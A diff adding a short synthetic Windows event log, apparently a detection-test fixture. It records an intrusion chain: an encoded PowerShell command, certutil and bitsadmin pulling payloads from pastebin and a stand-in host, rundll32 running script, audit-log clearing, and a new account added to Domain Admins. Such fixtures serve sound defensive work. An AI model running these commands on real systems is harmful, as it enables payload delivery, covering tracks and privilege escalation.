@@ -1,0 +1,7 @@
+2025-10-14T01:00:00Z EventID=4688 NewProcess=powershell.exe CommandLine="powershell -enc SQBFAFgAIAAtAFAARQByAE0A"
+2025-10-14T01:05:00Z EventID=4688 NewProcess=certutil.exe CommandLine="certutil -urlcache -split -f http://pastebin.com/raw/abcd payload.bin"
+2025-10-14T01:08:00Z EventID=4688 NewProcess=bitsadmin.exe CommandLine="bitsadmin /transfer job http://mega.example.com/file"
+2025-10-14T01:12:00Z EventID=4688 NewProcess=rundll32.exe CommandLine="rundll32 javascript:..,Open"
+2025-10-14T01:20:00Z EventID=1102 Message="The audit log was cleared"
+2025-10-14T01:30:00Z EventID=4720 Message="A user account was created: user=svc-backup"
+2025-10-14T01:35:00Z EventID=4728 Message="A member was added to a security-enabled global group: Domain Admins"
